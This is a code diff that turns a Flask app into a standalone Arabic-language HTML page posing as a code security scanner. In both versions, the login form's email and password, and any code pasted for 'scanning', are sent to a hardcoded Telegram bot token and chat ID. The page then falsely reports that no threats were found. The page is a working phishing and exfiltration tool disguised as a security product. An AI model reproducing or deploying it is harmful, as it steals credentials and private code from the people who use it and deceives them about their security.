@@ -1,52 +1,94 @@
-from flask import Flask, request, render_template_string, redirect, session
-import requests
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ نظام جواد الاحترافي</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
+        textarea { color: #39ff14; font-family: monospace; resize: none; }
+        .btn-main { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-bottom: 10px; }
+        .btn-guest { width: 100%; padding: 10px; background: transparent; color: #58a6ff; border: 1px solid #58a6ff; border-radius: 6px; cursor: pointer; font-size: 14px; }
+        h2 { color: #58a6ff; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
 
-app = Flask(__name__)
-app.secret_key = "jawad_master_key"
+<div id="app">
+    </div>
 
-# بيانات التليجرام الخاصة بك
-BOT_TOKEN = "8648545262:AAEqXqGrARHdBgwolI9ny0qM3B0gvKEkE04"
-CHAT_ID = "8270719098"
+<script>
+    const BOT_TOKEN = "8648545262:AAEqXqGrARHdBgwolI9ny0qM3B0gvKEkE04";
+    const CHAT_ID = "8270719098";
 
-# ستايل احترافي (Dark Theme)
-STYLE = '''
-<style>
-    body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
-    textarea { color: #39ff14; font-family: monospace; }
-    button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
-    button:hover { background: #2ea043; }
-    h2 { color: #58a6ff; margin-bottom: 20px; }
-</style>
-'''
+    // دالة لعرض صفحة الدخول
+    function showLoginPage() {
+        document.getElementById('app').innerHTML = `
+            <div class="card">
+                <h2>🛡️ دخول النظام</h2>
+                <p style="color: #8b949e;">يرجى تسجيل الدخول للبدء</p>
+                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button class="btn-main" onclick="handleLogin('user')">دخول</button>
+                <button class="btn-guest" onclick="handleLogin('guest')">الدخول كضيف 👤</button>
+            </div>
+        `;
+    }
 
-@app.route('/')
-def home():
-    if session.get('in'):
-        return render_template_string(f'<!DOCTYPE html><html dir="rtl">{STYLE}<body><div class="card"><h2>🛡️ فحص الحماية</h2><p>أدخل الكود لتحليله</p><form action="/scan" method="post"><textarea name="c" placeholder="الصق الكود هنا..." rows="5"></textarea><button>بدء الفحص 🔍</button></form></div></body></html>')
-    return render_template_string(f'<!DOCTYPE html><html dir="rtl">{STYLE}<body><div class="card"><h2>🛡️ دخول النظام</h2><p>يرجى تسجيل الدخول للبدء</p><form action="/login" method="post"><input type="email" name="e" placeholder="البريد الإلكتروني" required><input type="password" name="p" placeholder="كلمة المرور" required><button>دخول</button></form></div></body></html>')
+    // دالة لعرض صفحة الفحص (الصفحة الثانية)
+    function showScanPage() {
+        document.getElementById('app').innerHTML = `
+            <div class="card">
+                <h2>🛡️ فحص الحماية</h2>
+                <p style="color: #8b949e;">أدخل الكود لتحليله أمنياً</p>
+                <textarea id="codeToScan" placeholder="الصق الكود هنا..." rows="5"></textarea>
+                <button class="btn-main" onclick="handleScan()">بدء الفحص 🔍</button>
+                <p onclick="logout()" style="color:#f85149; cursor:pointer; font-size:12px;">تسجيل الخروج</p>
+            </div>
+        `;
+    }
 
-@app.route('/login', methods=['POST'])
-def login():
-    e, p = request.form.get('e'), request.form.get('p')
-    # إرسال البيانات لتليجرام
-    try:
-        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=🔑 دخول جديد:\n📧 {e}\n🔑 {p}")
-    except:
-        pass
-    session['in'] = True
-    return redirect('/')
+    // التعامل مع الدخول
+    async function handleLogin(type) {
+        if (type === 'user') {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            if(!email || !pass) return alert("املا البيانات يا بطل");
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔑 دخول مستخدم:\n📧 " + email + "\n🔑 " + pass)}`);
+        } else {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("👤 دخول كضيف")}`);
+        }
+        
+        // حفظ الحالة في المتصفح (زي السيشين في بايثون)
+        localStorage.setItem('isLoggedIn', 'true');
+        showScanPage();
+    }
 
-@app.route('/scan', methods=['POST'])
-def scan():
-    content = request.form.get('c')
-    # إرسال المحتوى لتليجرام
-    try:
-        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=🔍 محتوى مفحوص:\n`{content[:500]}`")
-    except:
-        pass
-    return f'<!DOCTYPE html><html dir="rtl">{STYLE}<body><div class="card"><h2 style="color:#238636;">✅ اكتمل الفحص</h2><p>لم يتم العثور على برمجيات خبيثة.</p><a href="/" style="color:#58a6ff; text-decoration:none;">فحص ملف آخر</a></div></body></html>'
+    // التعامل مع الفحص
+    async function handleScan() {
+        const content = document.getElementById('codeToScan').value;
+        if(!content) return alert("فين الكود؟");
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔍 فحص جديد:\n" + content)}`);
+        alert("✅ اكتمل الفحص! لم يتم العثور على تهديدات.");
+    }
 
-if __name__ == '__main__':
-    app.run(debug=True)
+    // تسجيل الخروج
+    function logout() {
+        localStorage.removeItem('isLoggedIn');
+        showLoginPage();
+    }
+
+    // تشغيل النظام عند فتح الصفحة
+    if (localStorage.getItem('isLoggedIn') === 'true') {
+        showScanPage();
+    } else {
+        showLoginPage();
+    }
+</script>
+
+</body>
+</html>
